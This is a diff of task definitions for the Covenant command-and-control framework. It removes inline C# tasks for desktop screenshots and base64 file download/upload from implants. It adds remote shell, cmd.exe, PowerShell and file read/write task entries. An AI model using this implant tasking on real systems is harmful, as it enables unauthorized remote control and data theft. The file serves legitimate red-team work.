@@ -1,60 +1,3 @@
-- Name: Help
-  Aliases: []
-  Description: Show the help menu.
-  Author: 
-      Name: Covenant
-      Handle: 
-      Link: https://github.com/cobbr/Covenant
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
-  - NetCore31
-  Code: ''
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options:
-  - Name: TaskName
-    Value: ''
-    DefaultValue: ''
-    Description: The GruntTask name to retrieve help information for.
-    SuggestedValues: []
-    Optional: true
-    DisplayInCommand: true
-    FileOption: false
-  ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
-  EmbeddedResources: []
-- Name: PowerShellImport
-  Aliases: []
-  Description: Import a PowerShell script.
-  Author: 
-      Name: Covenant
-      Handle: 
-      Link: https://github.com/cobbr/Covenant
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
-  Code: ''
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options:
-  - Name: Script
-    Value: ''
-    DefaultValue: ''
-    Description: PowerShell Script to import.
-    SuggestedValues: []
-    Optional: false
-    DisplayInCommand: false
-    FileOption: true
-  ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
-  EmbeddedResources: []
 - Name: Connect
   Aliases: []
   Description: Connect to a P2P Grunt.
@@ -66,7 +9,8 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
+  - Net45
+  - Net48
   Code: ''
   TaskingType: Connect
   UnsafeCompile: false
@@ -90,7 +34,34 @@
     DisplayInCommand: true
     FileOption: false
   ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
 - Name: Exit
   Aliases: []
@@ -103,7 +74,8 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
+  - Net45
+  - Net48
   - NetCore31
   Code: ''
   TaskingType: Exit
@@ -111,7 +83,34 @@
   TokenTask: false
   Options: []
   ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
 - Name: Tasks
   Aliases: []
@@ -124,7 +123,8 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
+  - Net45
+  - Net48
   - NetCore31
   Code: ''
   TaskingType: Tasks
@@ -132,7 +132,34 @@
   TokenTask: false
   Options: []
   ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
 - Name: TaskKill
   Aliases: []
@@ -145,7 +172,8 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
+  - Net45
+  - Net48
   - NetCore31
   Code: ''
   TaskingType: TaskKill
@@ -161,7 +189,34 @@
     DisplayInCommand: true
     FileOption: false
   ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
 - Name: Delay
   Aliases: []
@@ -174,7 +229,8 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
+  - Net45
+  - Net48
   - NetCore31
   Code: ''
   TaskingType: SetDelay
@@ -190,7 +246,34 @@
     DisplayInCommand: true
     FileOption: false
   ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
 - Name: Jitter
   Aliases: []
@@ -203,7 +286,8 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
+  - Net45
+  - Net48
   - NetCore31
   Code: ''
   TaskingType: SetJitter
@@ -219,7 +303,34 @@
     DisplayInCommand: true
     FileOption: false
   ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
 - Name: ConnectAttempts
   Aliases: []
@@ -232,7 +343,8 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
+  - Net45
+  - Net48
   - NetCore31
   Code: ''
   TaskingType: SetConnectAttempts
@@ -248,7 +360,34 @@
     DisplayInCommand: true
     FileOption: false
   ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
 - Name: KillDate
   Aliases: []
@@ -261,7 +400,8 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
+  - Net45
+  - Net48
   - NetCore31
   Code: ''
   TaskingType: SetKillDate
@@ -277,7 +417,34 @@
     DisplayInCommand: true
     FileOption: false
   ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
 - Name: Disconnect
   Aliases: []
@@ -290,7 +457,8 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
+  - Net45
+  - Net48
   Code: ''
   TaskingType: Disconnect
   UnsafeCompile: false
@@ -305,209 +473,947 @@
     DisplayInCommand: true
     FileOption: false
   ReferenceSourceLibraries: []
-  ReferenceAssemblies: []
-  EmbeddedResources: []
-- Name: ScreenShot
-  Aliases: []
-  Description: Takes a screenshot of the currently active desktop, move into a targeted pid for specific desktops
-  Author: 
-      Name: Muelsy
-      Handle: muelsy_
-      Link: https://twitter.com/muelsy_
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.IO;
-    using System.Text;
-    using System.Drawing;
-    using System.Drawing.Imaging;
-    using System.Windows.Forms;
-
-    public static class Task
-    {
-        public static string Execute()
-        {
-            try
-            {
-                Rectangle bounds = Screen.GetBounds(Point.Empty);
-                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
-                {
-                    using (Graphics g = Graphics.FromImage(bitmap))
-                    {
-                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
-                    }
-                    MemoryStream ms = new MemoryStream();
-                    bitmap.Save(ms, ImageFormat.Png);
-                    byte[] bmpBytes = ms.ToArray();
-                    return Convert.ToBase64String(bmpBytes);
-                }
-            } catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
-        }
-    }
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options: []
-  ReferenceSourceLibraries: []
   ReferenceAssemblies:
-  - Name: System.Drawing.dll
-    Location: net40\System.Drawing.dll
-    DotNetVersion: Net40
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
-  - Name: System.Windows.Forms.dll
-    Location: net40\System.Windows.Forms.dll
-    DotNetVersion: Net40
   - Name: mscorlib.dll
     Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
     DotNetVersion: Net35
   - Name: System.dll
     Location: net35\System.dll
     DotNetVersion: Net35
-  - Name: System.Drawing.dll
-    Location: net35\System.Drawing.dll
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
     DotNetVersion: Net35
-  - Name: System.Windows.Forms.dll
-    Location: net35\System.Windows.Forms.dll
-    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
-- Name: Download
+- Name: shell
   Aliases: []
-  Description: Download a file.
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
-  Help: 
+  Description: Execute a command directly (no cmd.exe).
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: shell <command> [arguments]"
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.IO;
-    using System.Text;
-    using System.Linq;
-    using System.Collections.Generic;
-
-    public static class Task
-    {
-        public static Stream OutputStream { get; set; }
-        public static string Execute(string FileName)
-        {
-            try
-            {
-                using (FileStream fs = File.OpenRead(FileName))
-                {
-                    byte[] read = new byte[1048576];
-                    int count;
-                    while ((count = fs.Read(read, 0, read.Length)) > 0)
-                    {
-                        IEnumerable<byte> finalRead = read.Take(count).AsEnumerable();
-                        int b = 0;
-                        while (count % 3 != 0 && b != -1)
-                        {
-                            b = fs.ReadByte();
-                            if (b != -1)
-                            {
-                              finalRead = finalRead.Concat(new byte[] { (byte)b });
-                            }
-                            count++;
-                        }
-                        byte[] base64 = Encoding.UTF8.GetBytes(Convert.ToBase64String(finalRead.ToArray()));
-                        OutputStream.Write(base64, 0, base64.Length);
-                        OutputStream.Flush();
-                    }
-                }
-                OutputStream.Close();
-                return "";
-            }
-            catch (Exception e)
-            {
-              if (OutputStream != null)
-              {
-                OutputStream.Close();
-              }
-              return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace;
-            }
-        }
-    }
-  TaskingType: Assembly
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: Shell
   UnsafeCompile: false
   TokenTask: false
   Options:
-  - Name: FileName
+  - Name: Command
     Value: ''
     DefaultValue: ''
-    Description: Remote file name to download.
+    Description: Command and arguments to execute.
     SuggestedValues: []
     Optional: false
     DisplayInCommand: true
     FileOption: false
   ReferenceSourceLibraries: []
   ReferenceAssemblies:
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
   - Name: mscorlib.dll
     Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
     DotNetVersion: Net35
   - Name: System.dll
     Location: net35\System.dll
     DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
-- Name: Upload
+- Name: shellcmd
   Aliases: []
-  Description: Upload a file.
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
-  Help: 
+  Description: Execute a command via cmd.exe /c.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: shellcmd <command>"
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.IO;
-
-    public static class Task
-    {
-        public static string Execute(string FilePath, string FileContents)
-        {
-            try
-            {
-                File.WriteAllBytes(FilePath, Convert.FromBase64String(FileContents));
-                return FilePath;
-            }
-            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
-        }
-    }
-  TaskingType: Assembly
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: ShellCmd
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Command to execute via cmd.exe /c.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: powershell
+  Aliases: []
+  Description: Execute a PowerShell command.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: powershell <command>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: PowerShell
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: PowerShell command to execute.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: whoami
+  Aliases: []
+  Description: Get the current user identity.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: whoami"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: WhoAmI
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: pwd
+  Aliases: []
+  Description: Get the current working directory.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: pwd"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: Pwd
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: cd
+  Aliases: []
+  Description: Change the current working directory.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: cd <path>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: Cd
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Path
+    Value: ''
+    DefaultValue: ''
+    Description: Path to change to.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: ls
+  Aliases: []
+  Description: List directory contents.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: ls [path]"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: ListDirectory
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Path
+    Value: ''
+    DefaultValue: ''
+    Description: Path to list (default is current directory).
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: cat
+  Aliases: []
+  Description: Read and display file contents.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: cat <filepath>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: ReadFile
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Path
+    Value: ''
+    DefaultValue: ''
+    Description: Path to file to read.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: write
+  Aliases: []
+  Description: Write content to a file.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: write /path:/path/to/file /content:\"content to write\""
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: WriteFile
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Path
+    Value: ''
+    DefaultValue: ''
+    Description: Path to file to write.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Content
+    Value: ''
+    DefaultValue: ''
+    Description: Content to write to the file.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: hostname
+  Aliases: []
+  Description: Get the hostname of the machine.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: hostname"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: GetHostname
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
